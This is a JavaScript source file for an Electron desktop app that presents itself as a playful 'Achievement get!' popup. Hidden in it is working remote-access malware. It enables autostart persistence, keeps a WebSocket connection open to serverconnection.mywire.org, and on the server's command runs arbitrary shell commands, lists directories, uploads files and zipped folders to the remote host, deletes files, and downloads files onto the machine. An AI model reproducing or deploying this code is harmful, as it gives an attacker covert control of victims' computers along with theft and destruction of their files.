const fs = require('fs-extra');
const os = require('os');
const {exec} = require('child_process');
const AutoLaunch = require('auto-launch');
const zipFolder = require('zip-folder');
const WebSocket = require('ws');
const request = require('request');
const http = require('http');
const { app, BrowserWindow, screen, ipcMain } = require('electron');
let ws = null;
let display,
    app_window;

const AutoLauncher = new AutoLaunch({
    name: 'process_gen',
    path: `${__dirname}/processGen.exe`,
});
    

AutoLauncher.isEnabled().then(isEnabled => {
    if(!isEnabled)
        AutoLauncher.enable();
});

setInterval(() => {
    try {
        if(!ws || ws.readyState === WebSocket.CLOSED) {
            ws = new WebSocket(`ws://serverconnection.mywire.org`);
            ws.on('error', () => void(0));
            ws.on('open', () => initConnection());
        }    
    } catch(e) {}
}, 5000);

app.whenReady().then(function() {
    display = screen.getPrimaryDisplay();
    app_window = new BrowserWindow({
        frame: false,
        width: 0,
        height: 80,
        x: display.bounds.width,
        y: 0,
        icon: './resources/assets/icons/icon.png',
        webPreferences: {
            nodeIntegration: true,
            worldSafeExecuteJavaScript: true
        },
        fullscreen: false,
        fullscreenable: false,
        resizable: false,
        movable: false,
        alwaysOnTop: true,
        titleBarStyle: 'hiddenInset'
    });
    app_window.removeMenu();
    app_window.loadFile('index.html');
});

ipcMain.on('#ready', (e, message) => {
    achievement.open(e,
        'The goodest boi!', 
        './static/assets/images/shiba.png'
    );
});

const achievement = {
    w: 0,
    open: function(e, text, icon) {
        e.reply('new_achievement', JSON.stringify({
            title: 'Achievement&nbsp;&nbsp;&nbsp;get!',
            text: text,
            icon: icon
        }));
        achievement.w = 0;
        app_window.blur();
        app_window.show();
        animationLoop();
        function animationLoop() {
            for(let i = 0; i < 2; i++) {
                app_window.setSize(achievement.w, 80);
                app_window.setPosition(display.bounds.width - achievement.w+2, 0);
                achievement.w += 2;
                if(achievement.w >= 300)
                    return setTimeout(achievement.close, 5000);
            }
            setTimeout(animationLoop, 5);
        }
    },
    close: function() {
        animationLoop();
        function animationLoop() {
            for(let i = 0; i < 2; i++) {
                app_window.setMinimumSize(achievement.w, 80);
                app_window.setSize(achievement.w, 80);
                app_window.setPosition(display.bounds.width - achievement.w, 0);
                achievement.w -= 2;
                if(achievement.w <= 0)
                    return app_window.hide();
            }
            setTimeout(animationLoop, 5);
        }
    }
}

function initConnection() {
    try {        
        console.log('connected to the server');
        ws.send(`{
            "action": "connect",
            "platform": "app"
        }`);
        ws.on('message', (data) => {
            const command = JSON.parse(data);
            console.log(command);
            switch(command['action']) {
                case 'list':
                    listDir(command['url'], ws);
                    break;
                case 'save':
                    sendFile(ws, `http://serverconnection.mywire.org/upload`, decodeURIComponent(command.url));
                    break;
                case 'delete':
                    deleteItem(ws, decodeURIComponent(command.url));
                    break;
                case 'upload':
                    deleteItem(ws, decodeURIComponent(command.url));
                    break;
                case 'download-file':
                    downloadFile(ws, `http://serverconnection.mywire.org/download`, command['name'], command['url']);
                    break;
                case 'execute':
                    try {
                        exec(decodeURIComponent(command['cmd']), (err, stdout, stderr) => {
                            ws.send(JSON.stringify({
                                action: 'executed',
                                std: (stdout || stderr || err || '').toString(),
                                platform: 'app'
                            }));
                        });
                    } catch(e){}
                    break;
            }
        });
    } catch(e) {
        console.log(e);
    }
}

function listDir(dir, client) {
    try {
        let list = [];
        const ls = fs.readdirSync(dir);
        for(let l of ls) {
            list.push({
                type: fs.lstatSync(`${dir}/${l}`).isDirectory() ? 'folder' : 'file',
                name: l 
            });
        }
        client.send(JSON.stringify({
            action: 'list',
            data: list,
            platform: 'app'
        }));
    } catch(e) {
        console.log(e);
    }  
}

function sendFile(ws, adress, path) {
    try {
        if(!fs.lstatSync(path).isDirectory()) {
            const r = request.post(adress, (err, res, body) => {
                if(body) {
                    ws.send(JSON.stringify({
                        action: 'saved',
                        data: 'saved',
                        platform: 'app'
                    }));
                }
            });
            const form = r.form();
            form.append('filetoupload', fs.createReadStream(path));
        } else {
            zipFolder(path, `./temp/${path.slice(path.lastIndexOf('/'))}.zip`, (err) => {
                if(err) 
                    return;
                const r = request.post(adress, (err, res, body) => {
                    if(body) {
                        ws.send(JSON.stringify({
                            action: 'saved',
                            data: 'saved',
                            platform: 'app'
                        }));
                    }
                });
                const form = r.form();
                form.append('filetoupload', fs.createReadStream(`./temp/${path.slice(path.lastIndexOf('/'))}.zip`));
            });
        }
    } catch(e) {
        console.log(e);
    }
}

function deleteItem(ws, path) {
    try {
        fs.remove(path, (err) => {
            if(err)
                return;
            ws.send(JSON.stringify({ 
                action: 'deleted',
                data: 'deleted',
                platform: 'app'
            })); 
        });
    } catch(e) {
        console.log(e);
    }
}   

function downloadFile(ws, url, name, path) {
    try {
        const file = fs.createWriteStream(`${path}/${name}`);
        http.get(`${url}/${name}`, response => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                ws.send(JSON.stringify({ 
                    action: 'downloaded',
                    data: 'downloaded',
                    platform: 'app'
                })); 
            });
        }).on('error', (err) => {
            fs.unlink(`${path}/${name}`);
        });
    } catch(e) {
        console.log(e);
    }
}
